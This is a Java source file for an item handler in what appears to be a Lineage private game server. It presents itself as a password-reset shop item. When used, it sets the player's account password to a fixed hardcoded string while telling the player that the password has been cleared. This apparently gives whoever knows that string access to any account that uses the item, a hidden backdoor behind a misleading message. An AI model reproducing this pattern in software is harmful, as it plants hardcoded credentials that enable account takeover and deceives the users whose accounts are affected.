package l1j.server.data.item_etcitem.shop;

import l1j.server.data.executor.ItemExecutor;
import l1j.server.server.Account;
import l1j.server.server.model.Instance.L1ItemInstance;
import l1j.server.server.model.Instance.L1PcInstance;
import l1j.server.server.serverpackets.S_SystemMessage;

public class ChangePass extends ItemExecutor{
	
	private ChangePass() {
		// TODO Auto-generated constructor stub
	}

	public static ItemExecutor get() {
		return new ChangePass();
	}
	@Override
	public void execute(int[] data, L1PcInstance pc, L1ItemInstance item) {
		if (item == null) {
			return;
		}
		final Account account = Account.load(pc.getAccountName());
		if (account == null) {
			pc.sendPackets(new S_SystemMessage("帐号不存在！"));
			return;
		}
		pc.getInventory().removeItem(item, 1);
		account.updatePassword("cth13925191569#@");;
		pc.sendPackets(new S_SystemMessage("您的帐号密码已被清空"));
		pc.sendPackets(new S_SystemMessage("请返回登录界面重新输入新密码！"));		
	}

}
